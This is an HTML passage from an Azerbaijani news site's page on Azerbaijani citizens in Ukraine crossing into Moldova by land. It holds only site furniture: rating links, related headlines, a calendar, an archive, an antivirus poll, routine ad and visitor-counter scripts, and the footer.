		<li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#" title="Pis" class="r1-unit" onclick="doRate(&#39;1&#39;, &#39;71428&#39;); return false;"><span class="masha_index masha_index15" rel="15"></span>1</a></li>
		<li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#" title="Münasib" class="r2-unit" onclick="doRate(&#39;2&#39;, &#39;71428&#39;); return false;"><span class="masha_index masha_index16" rel="16"></span>2</a></li>
		<li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#" title="Orta" class="r3-unit" onclick="doRate(&#39;3&#39;, &#39;71428&#39;); return false;"><span class="masha_index masha_index17" rel="17"></span>3</a></li>
		<li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#" title="Yaxşı" class="r4-unit" onclick="doRate(&#39;4&#39;, &#39;71428&#39;); return false;"><span class="masha_index masha_index18" rel="18"></span>4</a></li>
		<li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#" title="Əla" class="r5-unit" onclick="doRate(&#39;5&#39;, &#39;71428&#39;); return false;"><span class="masha_index masha_index19" rel="19"></span>5</a></li>
		</ul>
	</div>
</div></div>




					</div>
					<div style="float: right; padding-bottom: 5px;">
						<a href="javascript:history.back()">
							<font face="Oswald" style="font-size: 16pt;"><span class="masha_index masha_index20" rel="20"></span>Geri</font>
						</a>
					</div>
				</div>
			</div> 
		</div>
	</div>
</div>

<div class="box_inner cat_box recent_bd">
	<div class="news_box">
		<h3 class="news_box_title4"><span class="masha_index masha_index21" rel="21"></span>Oxşar yazılar :</h3>
		<ul class="images">
			﻿<li class="related_item">
	<div class="post_thumbnail">
		<a style="opacity: 1; width: 67px; height: 67px;" original-title="" href="https://gundemxeber.az/siyaset/58952-xn-moldova-munaqishenin-azerbaycanin-erazi-butovluyu-cherchivesinde-helline-terefdardir.html" rel="bookmark">
			<img style="opacity: 1;" class="ntImage-img" src="./xeber_files/1594737102_oxu.jpg" alt="XİN: “Moldova münaqişənin Azərbaycanın ərazi bütövlüyü çərçivəsində həllinə tərəfdardır”">
		</a>
	</div> 
	<h3><a original-title="" href="https://gundemxeber.az/siyaset/58952-xn-moldova-munaqishenin-azerbaycanin-erazi-butovluyu-cherchivesinde-helline-terefdardir.html"><span class="masha_index masha_index22" rel="22"></span>XİN: “Moldova münaqişənin Azərbaycanın ərazi ...</a></h3>
	<p class="date"><span class="masha_index masha_index23" rel="23"></span>14-07-2020, 18:30</p>
</li>﻿<li class="related_item">
	<div class="post_thumbnail">
		<a style="opacity: 1; width: 67px; height: 67px;" original-title="" href="https://gundemxeber.az/olke/cemiyyet/49444-ukrayna-oz-vetendashlarina-azerbaycanin-ishgal-olunmush-erazilerine-seferleri-qadagan-edib.html" rel="bookmark">
			<img style="opacity: 1;" class="ntImage-img" src="./xeber_files/1553777605_kkki.jpg" alt="Ukrayna öz vətəndaşlarına Azərbaycanın işğal olunmuş ərazilərinə səfərləri qadağan edib">
		</a>
	</div> 
	<h3><a original-title="" href="https://gundemxeber.az/olke/cemiyyet/49444-ukrayna-oz-vetendashlarina-azerbaycanin-ishgal-olunmush-erazilerine-seferleri-qadagan-edib.html"><span class="masha_index masha_index24" rel="24"></span>Ukrayna öz vətəndaşlarına Azərbaycanın işğal ...</a></h3>
	<p class="date"><span class="masha_index masha_index25" rel="25"></span>28-03-2019, 16:53</p>
</li>﻿<li class="related_item">
	<div class="post_thumbnail">
		<a style="opacity: 1; width: 67px; height: 67px;" original-title="" href="https://gundemxeber.az/siyaset/71401-resmi-bakidan-ukraynada-yasayan-azerbaycanlilara-muracet.html" rel="bookmark">
			<img style="opacity: 1;" class="ntImage-img" src="./xeber_files/1645696042__rom1098.jpg" alt="Rəsmi Bakıdan Ukraynada yaşayan azərbaycanlılara MÜRACİƏT">
		</a>
	</div> 
	<h3><a original-title="" href="https://gundemxeber.az/siyaset/71401-resmi-bakidan-ukraynada-yasayan-azerbaycanlilara-muracet.html"><span class="masha_index masha_index26" rel="26"></span>Rəsmi Bakıdan Ukraynada yaşayan azərbaycanlılara ...</a></h3>
	<p class="date"><span class="masha_index masha_index27" rel="27"></span>Dünən, 13:37</p>
</li>﻿<li class="related_item">
	<div class="post_thumbnail">
		<a style="opacity: 1; width: 67px; height: 67px;" original-title="" href="https://gundemxeber.az/siyaset/31021-prezident-lham-eliyev-azerbaycan-ve-moldova-gelecek-birge-fealiyyetin-yollarini-mueyyenleshdiribler.html" rel="bookmark">
			<img style="opacity: 1;" class="ntImage-img" src="./xeber_files/1498128124_1.jpg" alt="Prezident İlham Əliyev: &quot;Azərbaycan və Moldova gələcək birgə fəaliyyətin yollarını müəyyənləşdiriblər&quot;">
		</a>
	</div> 
	<h3><a original-title="" href="https://gundemxeber.az/siyaset/31021-prezident-lham-eliyev-azerbaycan-ve-moldova-gelecek-birge-fealiyyetin-yollarini-mueyyenleshdiribler.html"><span class="masha_index masha_index28" rel="28"></span>Prezident İlham Əliyev: "Azərbaycan və ...</a></h3>
	<p class="date"><span class="masha_index masha_index29" rel="29"></span>22-06-2017, 14:41</p>
</li>﻿<li class="related_item">
	<div class="post_thumbnail">
		<a style="opacity: 1; width: 67px; height: 67px;" original-title="" href="https://gundemxeber.az/olke/cemiyyet/71385-rusiyanin-ukraynaya-tecavuzu-ile-bagli-kxcp-ali-meclisinin-beyanati.html" rel="bookmark">
			<img style="opacity: 1;" class="ntImage-img" src="./xeber_files/1645626433_endirme.jpeg" alt="Rusiyanın Ukraynaya təcavüzü ilə bağlı KXCP Ali Məclisinin Bəyanatı">
		</a>
	</div> 
	<h3><a original-title="" href="https://gundemxeber.az/olke/cemiyyet/71385-rusiyanin-ukraynaya-tecavuzu-ile-bagli-kxcp-ali-meclisinin-beyanati.html"><span class="masha_index masha_index30" rel="30"></span>Rusiyanın Ukraynaya təcavüzü ilə bağlı KXCP Ali ...</a></h3>
	<p class="date"><span class="masha_index masha_index31" rel="31"></span>23-02-2022, 18:28</p>
</li>
		</ul>
	</div>
</div>
</div>



<!-- Место для рекламного баннера 9 -->	

<br>

<!-- END Место для рекламного баннера 9 -->	
								</div>
							</div>
							<div class="sidebar_wrapper">
							
							

                         
                                

<!-- Блок тип Календарь -->
							<div id="calendar-3" class="widget widget_calendar">
								<div class="widget_container">
									<h3 class="widget_title">Təqvim</h3>
									<div id="calendar_wrap">
<div id="calendar-layer"><table id="calendar" class="calendar"><tbody><tr><th colspan="7" class="monthselect"><a class="monthlink" onclick="doCalendar(&#39;01&#39;,&#39;2022&#39;,&#39;right&#39;); return false;" href="https://gundemxeber.az/2022/01/" original-title="Əvvəlki ay">«</a>&nbsp;&nbsp;&nbsp;&nbsp;Fevral 2022&nbsp;&nbsp;&nbsp;&nbsp;»</th></tr><tr><th class="workday">Be</th><th class="workday">Ça</th><th class="workday">Ç</th><th class="workday">Ca</th><th class="workday">C</th><th class="weekday">Ş</th><th class="weekday">B</th></tr><tr><td colspan="1">&nbsp;</td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/01/" original-title="Bu tarixdəki Xəbərlər:  01 fevral 2022">1</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/02/" original-title="Bu tarixdəki Xəbərlər:  02 fevral 2022">2</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/03/" original-title="Bu tarixdəki Xəbərlər:  03 fevral 2022">3</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/04/" original-title="Bu tarixdəki Xəbərlər:  04 fevral 2022">4</a></td><td class="day-active"><a class="day-active" href="https://gundemxeber.az/2022/02/05/" original-title="Bu tarixdəki Xəbərlər:  05 fevral 2022">5</a></td><td class="day-active"><a class="day-active" href="https://gundemxeber.az/2022/02/06/" original-title="Bu tarixdəki Xəbərlər:  06 fevral 2022">6</a></td></tr><tr><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/07/" original-title="Bu tarixdəki Xəbərlər:  07 fevral 2022">7</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/08/" original-title="Bu tarixdəki Xəbərlər:  08 fevral 2022">8</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/09/" original-title="Bu tarixdəki Xəbərlər:  09 fevral 2022">9</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/10/" original-title="Bu tarixdəki Xəbərlər:  10 fevral 2022">10</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/11/" original-title="Bu tarixdəki Xəbərlər:  11 fevral 2022">11</a></td><td class="day-active"><a class="day-active" href="https://gundemxeber.az/2022/02/12/" original-title="Bu tarixdəki Xəbərlər:  12 fevral 2022">12</a></td><td class="weekday">13</td></tr><tr><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/14/" original-title="Bu tarixdəki Xəbərlər:  14 fevral 2022">14</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/15/" original-title="Bu tarixdəki Xəbərlər:  15 fevral 2022">15</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/16/" original-title="Bu tarixdəki Xəbərlər:  16 fevral 2022">16</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/17/" original-title="Bu tarixdəki Xəbərlər:  17 fevral 2022">17</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/18/" original-title="Bu tarixdəki Xəbərlər:  18 fevral 2022">18</a></td><td class="day-active"><a class="day-active" href="https://gundemxeber.az/2022/02/19/" original-title="Bu tarixdəki Xəbərlər:  19 fevral 2022">19</a></td><td class="weekday">20</td></tr><tr><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/21/" original-title="Bu tarixdəki Xəbərlər:  21 fevral 2022">21</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/22/" original-title="Bu tarixdəki Xəbərlər:  22 fevral 2022">22</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/23/" original-title="Bu tarixdəki Xəbərlər:  23 fevral 2022">23</a></td><td class="day-active-v"><a class="day-active-v" href="https://gundemxeber.az/2022/02/24/" original-title="Bu tarixdəki Xəbərlər:  24 fevral 2022">24</a></td><td class="day-active-v day-current"><a class="day-active-v" href="https://gundemxeber.az/2022/02/25/" original-title="Bu tarixdəki Xəbərlər:  25 fevral 2022">25</a></td><td class="weekday">26</td><td class="weekday">27</td></tr><tr><td class="day">28</td><td colspan="6">&nbsp;</td></tr></tbody></table></div>												
									</div>
								</div>
							</div>
<!-- END Блок тип Календарь -->
<!-- Блок тип Архив новостей -->
							<div id="archives-2" class="widget widget_archive">
								<div class="widget_container">
									<h3 class="widget_title">Arxiv xəbərlər</h3>
<a class="archives" href="https://gundemxeber.az/2022/02/"><b>Fevral 2022 (590)</b></a><br><a class="archives" href="https://gundemxeber.az/2022/01/"><b>Yanvar 2022 (664)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/12/"><b>Dekabr 2021 (665)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/11/"><b>Noyabr 2021 (661)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/10/"><b>Oktyabr 2021 (667)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/09/"><b>Sentyabr 2021 (605)</b></a><br><div id="dle_news_archive" style="display:none;"><a class="archives" href="https://gundemxeber.az/2021/08/"><b>Avqust 2021 (506)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/07/"><b>İyul 2021 (543)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/06/"><b>İyun 2021 (672)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/05/"><b>May 2021 (586)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/04/"><b>Aprel 2021 (656)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/03/"><b>Mart 2021 (562)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/02/"><b>Fevral 2021 (609)</b></a><br><a class="archives" href="https://gundemxeber.az/2021/01/"><b>Yanvar 2021 (564)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/12/"><b>Dekabr 2020 (583)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/11/"><b>Noyabr 2020 (607)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/10/"><b>Oktyabr 2020 (753)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/09/"><b>Sentyabr 2020 (687)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/08/"><b>Avqust 2020 (766)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/07/"><b>İyul 2020 (767)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/06/"><b>İyun 2020 (675)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/05/"><b>May 2020 (642)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/04/"><b>Aprel 2020 (807)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/03/"><b>Mart 2020 (617)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/02/"><b>Fevral 2020 (668)</b></a><br><a class="archives" href="https://gundemxeber.az/2020/01/"><b>Yanvar 2020 (528)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/12/"><b>Dekabr 2019 (653)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/11/"><b>Noyabr 2019 (557)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/10/"><b>Oktyabr 2019 (594)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/09/"><b>Sentyabr 2019 (546)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/08/"><b>Avqust 2019 (454)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/07/"><b>İyul 2019 (616)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/06/"><b>İyun 2019 (462)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/05/"><b>May 2019 (585)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/04/"><b>Aprel 2019 (559)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/03/"><b>Mart 2019 (459)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/02/"><b>Fevral 2019 (490)</b></a><br><a class="archives" href="https://gundemxeber.az/2019/01/"><b>Yanvar 2019 (565)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/12/"><b>Dekabr 2018 (752)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/11/"><b>Noyabr 2018 (732)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/10/"><b>Oktyabr 2018 (1047)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/09/"><b>Sentyabr 2018 (772)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/08/"><b>Avqust 2018 (758)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/07/"><b>İyul 2018 (827)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/06/"><b>İyun 2018 (795)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/05/"><b>May 2018 (757)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/04/"><b>Aprel 2018 (859)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/03/"><b>Mart 2018 (683)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/02/"><b>Fevral 2018 (638)</b></a><br><a class="archives" href="https://gundemxeber.az/2018/01/"><b>Yanvar 2018 (851)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/12/"><b>Dekabr 2017 (946)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/11/"><b>Noyabr 2017 (1151)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/10/"><b>Oktyabr 2017 (931)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/09/"><b>Sentyabr 2017 (1092)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/08/"><b>Avqust 2017 (1201)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/07/"><b>İyul 2017 (1512)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/06/"><b>İyun 2017 (843)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/05/"><b>May 2017 (564)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/04/"><b>Aprel 2017 (558)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/03/"><b>Mart 2017 (624)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/02/"><b>Fevral 2017 (681)</b></a><br><a class="archives" href="https://gundemxeber.az/2017/01/"><b>Yanvar 2017 (531)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/12/"><b>Dekabr 2016 (515)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/11/"><b>Noyabr 2016 (350)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/10/"><b>Oktyabr 2016 (403)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/09/"><b>Sentyabr 2016 (402)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/08/"><b>Avqust 2016 (343)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/07/"><b>İyul 2016 (509)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/06/"><b>İyun 2016 (646)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/05/"><b>May 2016 (660)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/04/"><b>Aprel 2016 (680)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/03/"><b>Mart 2016 (602)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/02/"><b>Fevral 2016 (840)</b></a><br><a class="archives" href="https://gundemxeber.az/2016/01/"><b>Yanvar 2016 (467)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/12/"><b>Dekabr 2015 (627)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/11/"><b>Noyabr 2015 (727)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/10/"><b>Oktyabr 2015 (733)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/09/"><b>Sentyabr 2015 (580)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/08/"><b>Avqust 2015 (308)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/07/"><b>İyul 2015 (354)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/06/"><b>İyun 2015 (182)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/05/"><b>May 2015 (280)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/04/"><b>Aprel 2015 (270)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/03/"><b>Mart 2015 (371)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/02/"><b>Fevral 2015 (277)</b></a><br><a class="archives" href="https://gundemxeber.az/2015/01/"><b>Yanvar 2015 (554)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/12/"><b>Dekabr 2014 (697)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/11/"><b>Noyabr 2014 (584)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/10/"><b>Oktyabr 2014 (459)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/09/"><b>Sentyabr 2014 (490)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/08/"><b>Avqust 2014 (434)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/07/"><b>İyul 2014 (505)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/06/"><b>İyun 2014 (51)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/05/"><b>May 2014 (533)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/04/"><b>Aprel 2014 (437)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/03/"><b>Mart 2014 (295)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/02/"><b>Fevral 2014 (608)</b></a><br><a class="archives" href="https://gundemxeber.az/2014/01/"><b>Yanvar 2014 (923)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/12/"><b>Dekabr 2013 (1168)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/11/"><b>Noyabr 2013 (1064)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/10/"><b>Oktyabr 2013 (624)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/09/"><b>Sentyabr 2013 (458)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/08/"><b>Avqust 2013 (699)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/07/"><b>İyul 2013 (900)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/06/"><b>İyun 2013 (649)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/05/"><b>May 2013 (637)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/04/"><b>Aprel 2013 (293)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/03/"><b>Mart 2013 (164)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/02/"><b>Fevral 2013 (423)</b></a><br><a class="archives" href="https://gundemxeber.az/2013/01/"><b>Yanvar 2013 (450)</b></a><br><a class="archives" href="https://gundemxeber.az/2012/12/"><b>Dekabr 2012 (882)</b></a><br><a class="archives" href="https://gundemxeber.az/2012/11/"><b>Noyabr 2012 (17)</b></a><br></div><div id="dle_news_archive_link"><br><a class="archives" onclick="$(&#39;#dle_news_archive&#39;).toggle(&#39;blind&#39;,{},700); return false;" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#">Bütün arxivi göstər / gizlət</a></div>
								</div>
							</div>
<!-- END Блок тип Архив новостей -->
<!-- Блок тип 10 -->
							<div id="bd-comments-3" class="widget bd-comments">
								<div class="widget_container">
									<h3 class="widget_title">Sorğu</h3>
<script>
<!--
function doVote( event ){

	
	var vote_check = $('#dle-vote input:radio[name=vote_check]:checked').val();
	
	if (typeof vote_check == "undefined" &&  event == "vote") {
		return false;
	}
	
	ShowLoading('');

	$.get(dle_root + "engine/ajax/controller.php?mod=vote", { vote_id: "5", vote_action: event, vote_check: vote_check, vote_skin: dle_skin, user_hash: dle_login_hash }, function(data){

		HideLoading('');

		$("#vote-layer").fadeOut(500, function() {
			$(this).html(data);
			$(this).fadeIn(500);
		});

	});
}
//-->
</script><div id="vote-layer"><div id="votes" class="block">
	<div class="dtop">&nbsp;</div>
	<div class="dcont">
		<h4>Hansı Antivirusdan istiafdə edirsiniz?</h4>
		<div class="dpad">
			<form method="post" name="vote" action="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html">
			<div id="dle-vote"><div class="vote"><input id="vote_check0" name="vote_check" type="radio" value="0"><label for="vote_check0"> Avast!</label></div><div class="vote"><input id="vote_check1" name="vote_check" type="radio" value="1"><label for="vote_check1"> Avira</label></div><div class="vote"><input id="vote_check2" name="vote_check" type="radio" value="2"><label for="vote_check2"> AVG</label></div><div class="vote"><input id="vote_check3" name="vote_check" type="radio" value="3"><label for="vote_check3"> Dr.Web</label></div><div class="vote"><input id="vote_check4" name="vote_check" type="radio" value="4"><label for="vote_check4"> ESET NOD32</label></div><div class="vote"><input id="vote_check5" name="vote_check" type="radio" value="5"><label for="vote_check5"> Kaspersky</label></div><div class="vote"><input id="vote_check6" name="vote_check" type="radio" value="6"><label for="vote_check6"> Zillya</label></div><div class="vote"><input id="vote_check7" name="vote_check" type="radio" value="7"><label for="vote_check7"> Norton</label></div><div class="vote"><input id="vote_check8" name="vote_check" type="radio" value="8"><label for="vote_check8"> PC Tools Internet Security</label></div><div class="vote"><input id="vote_check9" name="vote_check" type="radio" value="9"><label for="vote_check9"> Trend Micro</label></div><div class="vote"><input id="vote_check10" name="vote_check" type="radio" value="10"><label for="vote_check10"> F-Secure</label></div><div class="vote"><input id="vote_check11" name="vote_check" type="radio" value="11"><label for="vote_check11"> TrustPort</label></div><div class="vote"><input id="vote_check12" name="vote_check" type="radio" value="12"><label for="vote_check12"> McAfee</label></div><div class="vote"><input id="vote_check13" name="vote_check" type="radio" value="13"><label for="vote_check13"> BitDefender</label></div><div class="vote"><input id="vote_check14" name="vote_check" type="radio" value="14"><label for="vote_check14"> GData</label></div><div class="vote"><input id="vote_check15" name="vote_check" type="radio" value="15"><label for="vote_check15"> Microsoft Essential</label></div><div class="vote"><input id="vote_check16" name="vote_check" type="radio" value="16"><label for="vote_check16"> Panda</label></div></div>
			<br>
			
			
				<input type="hidden" name="vote_action" value="vote">
				<input type="hidden" name="vote_id" id="vote_id" value="5">
				<button class="fbutton" type="submit" onclick="doVote(&#39;vote&#39;); return false;"><span>Səs ver</span></button>&nbsp;<button class="fbutton" type="button" onclick="doVote(&#39;results&#39;); return false;"><span>Nəticələr</span></button>
			</form>
			<br>
			<form method="post" name="vote_result" action="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html">
				<input type="hidden" name="vote_action" value="results">
				<input type="hidden" name="vote_id" value="5">
				<button class="fbutton" type="submit" onclick="ShowAllVotes(); return false;"><span>Bütün suallar</span></button>
			</form>
			
		</div>
	</div>
	<div class="dbtm">&nbsp;</div>
</div></div>
								</div>
							</div>
<!-- END Блок тип 10 -->

<!-- Блок тип 10 -
							<div id="bd-comments-3" class="widget bd-comments">
								<div class="widget_container">
									<h3 class="widget_title">Sayğac</h3>
									<p></p>
                                    
                                    
								</div>
							</div>
                          
                                
-- END Блок тип 10 -->

						</div>
						<div class="clear"></div>
						
<!-- Блок тип 12 -->

<!-- END Блок тип 12 -->
						<div class="clear"></div>
						
<style type="text/css">
#aab {color:#000;font-size:12px;}
#aab a{color:#000;text-decoration:none;font-size:12px;}
#aab a:hover{color:#000;text-decoration:underline;font-size:12px;}
</style>
<div id="aab"><script type="text/javascript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="https://www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script></div>

					</div>
				</div>
			</div>
		</div>
	</div>
<!-- Место для рекламного баннера 9 -->

<!-- END Место для рекламного баннера 9 -->

</div>
<!-- Footer -->	
<footer>
	<div class="spot">
		<div class="wrapper">
			<div class="content">
				<ol class="footer_widget"></ol>
			</div>
		</div>
		<div class="clear"></div>
	</div>
</footer>
<!-- END Footer -->	
<div class="clear"></div>
<!-- Footer bottom -->	
<div class="footer_bottom">
	<div class="wrapper">
		<div class="content">
<ul class="widget_social">
					<li style="opacity: 0.4;" class="youtube"><a original-title="youtube" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#">youtube</a></li>
					<li style="opacity: 0.4;" class="twitter"><a original-title="twitter" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#">twitter</a></li>
					<li style="opacity: 0.4;" class="rss"><a original-title="rss" href="https://gundemxeber.az/rss.xml">rss</a></li>
					<li style="opacity: 0.4;" class="googleplus"><a original-title="googleplus" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#">googleplus</a></li>
					<li style="opacity: 0.4;" class="flickr"><a original-title="flickr" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#">flickr</a></li>
					<li style="opacity: 0.4;" class="facebook"><a original-title="facebook" href="https://www.facebook.com/gundemxeber/">facebook</a></li>
				</ul>
            <b>Copyright © www.GundemXeber.az</b> / Bütün hüquqlar qorunur!<br>
			<b><span class="copyrights alignleft">BİZİMLƏ ƏLAQƏ: tel: (+99412) 538 76 26,  (+99450) 289 88 33, (+99470) 248 96 52 - Email: gundem-xeber@mail.ru</span></b><br>
            <b>Ünvan:</b> Bakı şəhəri, Mətbuat prospekti 529-cu məhəllə, ''Azərbaycan'' nəşriyyatı 1-ci mərtəbə
            <br><b>Qurucusu: Ş.Cəfəri</b> / <b>Direktor: Ç. Cəfəri</b>
                 <div style="    float: right; padding-right: 30px;">
            <!--LiveInternet counter--><a href="https://www.liveinternet.ru/click" target="_blank"><img id="licnt7C6C" width="88" height="31" style="border:0" title="LiveInternet: показано число просмотров за 24 часа, посетителей за 24 часа и за сегодня" src="https://counter.yadro.ru/hit?t14.6;rhttps%3A//gundemxeber.az/;s1536*864*24;uhttps%3A//gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html;hX%u0130N%3A%20Ukraynadak%u0131%20Az%u0259rbaycan%20v%u0259t%u0259nda%u015Flar%u0131%20quru%20yolla%20Moldova%20%u0259razisin%u0259%20ke%E7%u0259%20bil%u0259rl%u0259r%20%BB%20GundemXeber%20%u0130nformasiya%20Portal%u0131;0.1912782375337394" alt=""></a><script>(function(d,s){d.getElementById("licnt7C6C").src=
"https://counter.yadro.ru/hit?t14.6;r"+escape(d.referrer)+
((typeof(s)=="undefined")?"":";s"+s.width+"*"+s.height+"*"+
(s.colorDepth?s.colorDepth:s.pixelDepth))+";u"+escape(d.URL)+
";h"+escape(d.title.substring(0,150))+";"+Math.random()})
